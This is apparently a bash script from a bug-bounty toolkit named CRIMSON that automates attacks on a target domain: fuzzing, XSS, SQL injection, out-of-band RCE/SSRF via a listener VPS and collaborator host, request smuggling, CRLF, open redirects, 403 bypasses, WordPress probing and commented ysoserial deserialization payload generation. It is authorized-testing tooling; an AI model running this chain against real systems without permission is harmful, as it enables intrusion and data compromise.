#!/bin/bash
#
### CREATED BY KARMAZ
#
#
####  FUNCTIONS:
#
# 1. FUZZ PATHS IN URLS FROM dirs.txt WITH CUSTOM PAYLOADS
# 2. FUZZ PARAMS IN URLS FROM params.txt WITH CUSTOM PAYLOADS
# 3. TEST FOR XSS
# 4. CHECK FOR "X-Original-Url" OR "X-Rewrite-Url" HEADER
# 5. TEST HTTP REQUEST SMUGGLING
# 6. TEST HOP-BY-HOP DELETION
# 7. TEST FOR BROKEN LINKS
# 8. TEST SQLI
# 9. TEST OUT-OF-BOUND RCE/SSRF
# 10. TEST JAVA DESERIALIZATION
# 11. TEST CRLF INJECTION
# 12. TEST FOR OPEN REDIRECTION
# 13. TEST WORDPRESS
### LISTS:
#
# 1. bug_params.txt
# 2. bug_dirs.txt
# 3. vuln_xss
# 4. rewriter.txt
# 5. smuggler.txt
# 6. hop_by_hop.txt
# 7. broken_links.txt
# 8. sqli/
# 9. oob.txt
# 10. CRLF.txt
# 11. OR.txt
# 12. dalfox.txt
# 13. ssti.txt
# 14. wp/
# 15. dirdar.txt
# 16. csrf-$domain/
#
### WORKFLOW
#
# 0. Start BURP
# 1. Start vps listener and collaborator
# 2. Start the script
# 3. Check the output listed above (LISTS)
# 4. Check size and response code of bug_params.txt and bug_urls.txt
# 5. Look for [ID] [TIME] in oob.txt and compare it to pings on your vps / collaborator
# 8. Check deserialization pings with manual payloads generated by this script
# 9. Start manual testing 
# 10. Select all urls from sitemap in Burp Suite and use "https://github.com/PortSwigger/param-miner" to guess hidden parameter/functionalities/headers.
#
###


echo -e "\033[0;31m
 ██████╗██████╗ ██╗███╗   ███╗███████╗ ██████╗ ███╗   ██╗        ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║████╗ ████║██╔════╝██╔═══██╗████╗  ██║        ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║     ██████╔╝██║██╔████╔██║███████╗██║   ██║██╔██╗ ██║        █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
██║     ██╔══██╗██║██║╚██╔╝██║╚════██║██║   ██║██║╚██╗██║        ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
╚██████╗██║  ██║██║██║ ╚═╝ ██║███████║╚██████╔╝██║ ╚████║███████╗███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
 ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
\033[0m"

fuzzing_on=0
while getopts "c:d:i:D:x" OPTION; do
    case $OPTION in
    c)
        cookie=$OPTARG
        ;;
    d)
        collaborator_domain=$OPTARG
        ;;
    i)
        vps_ip=$OPTARG
        ;;
    D)
        domain=$OPTARG
        DOMAIN=`tldextract $domain | cut -d " " -f 2-3 | sed "s/\ /\./"`
        ;;
    x)
        fuzzing_on=1
        ;;
    *)
        echo "Incorrect options provided"
        exit 1
        ;;
    esac
done

### CHECK IF USER SET A COOKIE IF NOT SET IT TO a
if [ -z "$cookie" ]
then
    export cookie="Cookie: a=1;";
else
    export cookie=$cookie;
fi

if [ -z $collaborator_domain ] || [ -z $vps_ip ] || [ -z $domain ] || [ -z $DOMAIN ]
then
	echo "Export domain and DOMAIN first!"
	echo "	Usage: ./crimson_exploit -D [domain_to_export] -i [listener_vps_ip] -d [collaborator_domain]"
	exit 1
else
    ### CHANGE TO WORKING DIRECTORY AND REVIEW THE CONTENT OF FILES
    cd $HOME/bounty/$DOMAIN/$domain/exp
    scite params.txt dirs.txt

    ### TESTING CSRF ON MAIN PAGE WITH CRAWLING
    echo -e "\033[0;31m [+]\033[0m CHECKING CSRF"
    xsrfprobe -u "$domain" --crawl --no-verify -o csrf- -c "$cookie" -q

    ### TESTING FOR CRYPTOGRAPHIC ISSUES
    testssl.sh --warnings off $domain | tee -a testssl.txt

    ### --- FUZZING SECTION --- ###
    if [ $fuzzing_on == 1 ]
    then
        if [ -s "params.txt" ]
        then
            echo -e "\033[0;31m [+]\033[0m PARAMETER FUZZING"

            ### FUZZ ALL URLS IN params.txt WITH bug WORDLIST > bug_params.txt
            python $HOME/tools/CRIMSON/scripts/crimson_paramjuggler.py -l params.txt -p "FUZZ" >> temp_params.txt
            custom_i=0; for line in $(cat temp_params.txt); do custom_i=$((custom_i+1)) && wfuzz -f temp_bug$custom_i.txt,raw -Z -z file,$HOME/tools/CRIMSON/words/bug -H "$cookie" $line | tail -n+11; done
            sort -u  temp_bug* | grep "http" | grep -v "Pycurl" | grep -v "^Target" > bug_params.txt
            rm temp_bug*
        else
            echo " [-] params.txt IS EMPTY"
        fi

        if [ -s "dirs.txt" ]
        then
            echo -e "\033[0;31m [+]\033[0mURL FUZZING"
            ### FUZZ ALL URLS IN dirs.txt WITH bug WORDLIST > bug_dirs.txt
            wfuzz -f bug_dirs.txt,raw -L -Z -z file,dirs.txt -z file,$HOME/tools/CRIMSON/words/bug -H "$cookie" FUZZFUZ2Z
        else
        	echo " [-] dirs.txt IS EMPTY"
        fi
    fi
    ### --- END OF FUZZING SECTION --- ###

    ### MERGE (params.txt) AND (dirs.txt) > all.txt
    sort -u dirs.txt >> all.txt
    cat params.txt | anew all.txt

    ### CHECK FOR XSS VULNERABILITY in all.txt > vuln_xss
    echo -e "\033[0;31m [+]\033[0m LOOKING FOR XSS VULNERABILITIES WITH XSS-STRIKE"
    python3 $HOME/tools/XSStrike/xsstrike.py --seeds all.txt -t 100 | tee -a xss

    ### TEST XSS USING DAFLOX > dalfox.txt
    echo -e "\033[0;31m [+]\033[0m LOOKING FOR XSS VULNERABILITIES WITH DALFOX"
    cat all.txt | dalfox pipe --mass --silence --no-color -o dalfox.txt

    ### TEST URL REWRITING > rewriter.txt
    echo -e "\033[0;31m [+]\033[0m CHECKING IF X-Rewrite-Url && X-Original-Url IS BEING USED"
    python3 $HOME/tools/CRIMSON/scripts/crimson_rewriter.py -w all.txt -c "$cookie" -o rewriter.txt

    ### TEST OOB > oob.txt
    echo -e "\033[0;31m [+]\033[0m TESTING OUT-OF-BOUND INTERACTIONS"
    $HOME/tools/CRIMSON/scripts/crimson_oobtester.py -c "$cookie" -i $vps_ip -d $collaborator_domain -p "$HOME/tools/CRIMSON/words/exp/OOB" -w "params.txt" -o oob.txt

    ### TEST JAVA DESERIALIZATION
    echo -e "\033[0;31m [+]\033[0m TESTING JAVA DESERIALIZATION (OOB)"
    python $HOME/tools/CRIMSON/scripts/crimson_deserializator.py -d $collaborator_domain -w params.txt -c "$cookie"

    ### TEST CRLF > CRLF.txt
    echo -e "\033[0;31m [+]\033[0m TESTING FOR CRLF INJECTIONS IN URL"
    crlfuzz -l all.txt -s | tee -a CRLF.txt

    ### TEST OR > OR.txt
    echo -e "\033[0;31m [+]\033[0m TESTING FOR OPEN REDIRECTIONS IN URL"
    cat dirs.txt | sed "s/$/FUZZ/"  >> temp_or_test.txt
    cat temp_params.txt >> temp_or_test.txt
    custom_i=0; for line in $(cat temp_or_test.txt); do custom_i=$((custom_i+1)) && wfuzz -f temp_OR$custom_i.txt,raw -Z -z file,$HOME/tools/CRIMSON/words/exp/OR --sc 300,301,302,303,304,305,306,307,308 -H $cookie $line | tail -n+11 ;done
    sort -u  temp_OR* | grep "http" | grep -v "Pycurl" | grep -v "^Target" >> OR.txt
    rm temp_OR*

    ### TEST SSTI > SSTI.txt
    echo -e "\033[0;31m [+]\033[0m TESTING FOR SERVER SIDE TEMPLATE INJECTIONS"
    python crimson_templator.py -w params.txt -c "$cookie" -o SSTI.txt

    ### GENERATE ALL JAVA PAYLOADS FOR MANUAL DESERIALIZATION
    #for gadget in $(cat $HOME/tools/CRIMSON/words/exp/jargadgetss); do java -jar $HOME/tools/ysoserial/ysoserial.jar $gadget "$collaborator_domain" | base64 -w0 >> temp_payloads.txt && echo >> temp_payloads.txt ;done ; sed '/^$/d' temp_payloads.txt > java_deserialization_payloads.txt; rm temp_payloads.txt

    ### GENERATE ALL PAYLOADS FOR .NET DESERIALIZATION FOR MANUAL TESTING
    #for gadget in $(cat $HOME/tools/CRIMSON/words/exp/netgadgets); do wine $HOME/tools/netysoserial/ysoserial.exe -f BinaryFormatter -g $gadget -o base64 -c "$collaborator_domain" >> net_deserialization_payloads.txt ;done

    ### TRYING TO BYPASS 403/401 RESTRICTED AREA > dirdar.txt
    echo -e "\033[0;31m [+]\033[0m TRYING TO BYPASS 403 && 401 SITES"
    cat ../status_dir.txt| grep "C=403\|C=401" | cut -d "\"" -f 2 > 403.txt
    cat 403.txt | dirdar | tee -a dirdar.txt
    rm 403.txt

    ### CHECK IF THIS THERE IS A WORDPRESS AND EXPLOIT IT
    if [[ `cat ../recon.txt | grep cms_name | cut -d "\"" -f 4` == "WordPress" ]]
    then
        mkdir wp
        echo -e "\033[0;31m [+]\033[0mURL STARTING WP ENUMERATION"
        ### ENUMERATION USING wpscan > wpscan.txt
        wpscan --no-banner --url $domain -o wp/wpscan.txt --cookie-string "$cookie" --no-update
        ### SSRF CHECK
        echo -e "\033[0;31m [+]\033[0mURL LOOKING FOR SSRF IN WORDPRESS"
        $HOME/tools/quickpress/quickpress -server http://$domain_collab -target https://$domain
        $HOME/tools/quickpress/quickpress -server http://$domain_collab -target http://$domain
        ### PLUGIN ENUMERATION > plugins.txt && ssl_plugins.txt
        echo -e "\033[0;31m [+]\033[0mURL BRUTEFORCING PLUGINS"
        python3 $HOME/tools/WPluginScanner/wpluginscanner.py http://$domain -o wp/plugins.txt -p popular.txt > /dev/null 2>&1
        python3 $HOME/tools/WPluginScanner/wpluginscanner.py https://$domain -o wp/ssl_plugins.txt -p popular.txt > /dev/null 2>&1
        echo -e "\033[0;31m [+]\033[0mURL CHECK WP/ DIRECTORY AND RUN python3 wpbullet.py --path DOWNLOADED_PLUGIN"
    fi

    ### TEST HTTP REQUEST SMUGGLING > smuggler.txt
    echo -e "\033[0;31m [+]\033[0m TESTING HTTP REQUESTS SMUGGLING"
    cat all.txt | python3 $HOME/tools/smuggler/smuggler.py -l smuggler.txt -q | tee -a log_smuggler.txt

    ### TEST HOP-BY-HOP DELETION (only on main page) > hop_by_hop.txt
    echo -e "\033[0;31m [+]\033[0m TESTING HOP-BY-HOP DELETION"
    for HEADER in $(cat $HOME/tools/CRIMSON/words/exp/hbh-headers); do python $HOME/tools/hop-by-hop/hbh-header-abuse-test.py -u "https://$domain" -x "$HEADER"; sleep 1; done | tee -a hop_by_hop.txt
    
    ### TEST BROKEN  LINKS > broken_links.txt
    echo -e "\033[0;31m [+]\033[0m LOOKING FOR BROKEN LINKS"
    for url in $(cat all.txt); do blc $url -ro >> broken_links.txt ;done

    ### TEST SQLi > sqli/
    echo -e "\033[0;31m [+]\033[0m TESTING SQLI"
    sqlmap -m params.txt -b --batch -o -v 0 -H "$cookie" - --output-dir=sqli

    ### OPEN ALL XSS IN FIREFOX FOR MANUAL REVIEW
    echo -e "\033[0;31m [+]\033[0m OPENING VULNERABLE XSS IN FIREFOX"
    cat xss | grep "Vulnerable webpage" | sed "s/^.*http/http/" | cat -A | sed 's/\^.*$//' > url_XSS
    cat xss | grep "Vulnerable webpage" -A 1 | grep Vector | cut -d " " -f 4 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | sed 's/://' > param_XSS
    cat xss | grep "Vulnerable webpage" -A 1 | grep Vector | cut -d " " -f 5 > payload_XSS 
    paste url_XSS param_XSS payload_XSS | cat -A | sed 's/\^I/\?/' | sed 's/\^I/=/' | sed -r 's/(.*)\$/\1 /' > vuln_xss && rm url_XSS param_XSS payload_XSS
    python $HOME/tools/CRIMSON/scripts/crimson_opener -o vuln_xss

    ### CHECK FILES
    scite vuln_xss rewriter.txt smuggler.txt CRLF.txt OR.txt broken_links.txt hop_by_hop.txt SSTI.txt dalfox.txt dirdar.txt

    ### REMOVE TRASH
    rm temp_params.txt temp_dirs.txt
fi
